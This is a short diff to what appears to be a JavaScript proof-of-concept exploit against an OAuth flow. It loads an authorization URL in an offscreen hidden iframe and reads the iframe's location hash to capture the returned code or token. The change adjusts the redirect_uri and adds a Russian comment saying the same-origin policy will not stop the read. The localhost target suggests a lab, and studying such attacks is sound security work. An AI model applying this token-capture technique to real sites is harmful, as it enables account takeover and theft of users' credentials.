@@ -5,7 +5,7 @@ const authorizationURL =
     "&response_type=code" +
     "&scope=openid" +
     "&redirect_uri=" +
-    encodeURIComponent("http://127.0.0.1:8000/oauth/callback") +
+    encodeURIComponent("http://127.0.0.1:8000/callback") +
     "&response_mode=fragment" +
     "&state=fooooooooo";
 
@@ -20,7 +20,7 @@ iframe.style.left = "-10000px";
 iframe.src = authorizationURL;
 iframe.onload = () => {
     console.log("[+] iframe loaded");
-    console.log("[+] iframe URL:", iframe.contentWindow.location.href);
+    console.log("[+] iframe URL:", iframe.contentWindow.location.href); // тут должен отработать SOP но этого не произойдет
     console.log("[+] iframe hash:", iframe.contentWindow.location.hash);
 
     const params = new URLSearchParams(
